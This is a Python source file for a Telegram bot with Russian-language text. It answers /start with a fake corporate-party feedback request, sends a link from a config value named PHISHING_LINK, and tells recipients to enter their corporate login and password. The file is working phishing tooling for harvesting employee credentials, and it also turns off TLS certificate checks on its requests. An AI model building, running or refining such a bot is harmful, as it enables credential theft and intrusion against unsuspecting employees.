import logging
import requests

from config import TOKEN, PHISHING_LINK

logging.basicConfig(level=logging.INFO)

API_URL = f"https://api.telegram.org/bot{TOKEN}"

def send_message(chat_id, text):
    url = f"{API_URL}/sendMessage"
    payload = {
        "chat_id": chat_id,
        "text": text,
        "parse_mode": "Markdown"
    }
    response = requests.post(url, data=payload, verify=False)
    if response.status_code != 200:
        logging.error(f"Ошибка при отправке сообщения: {response.text}")
    else:
        logging.info(f"Сообщение успешно отправлено в чат {chat_id}")

def get_updates(offset=None):
    url = f"{API_URL}/getUpdates"
    params = {"timeout": 100, "offset": offset}
    response = requests.get(url, params=params)
    return response.json()

def main():
    logging.info("Бот запущен через...")
    offset = None

    while True:
        updates = get_updates(offset)

        if "result" in updates:
            for update in updates["result"]:
                offset = update["update_id"] + 1

                if "message" in update and "text" in update["message"]:
                    message = update["message"]
                    chat_id = message["chat"]["id"]
                    user = message["from"]

                    logging.info(f"Получено сообщение от @{user.get('username', 'unknown')} (ID: {user['id']})")

                    if message["text"] == "/start":
                        text = (
                            f"Привет 👋\n\nКак тебе корпоратив? 🎉\n"
                            f"Мы собираем обратную связь! Пожалуйста, оцени мероприятие по ссылке:\n\n"
                            f"👉 {PHISHING_LINK}\n\n"
                            f"⚠️ Доступ только для сотрудников. Введите корпоративный логин и пароль перед отзывом."
                        )
                        send_message(chat_id, text)

if __name__ == "__main__":
    main()
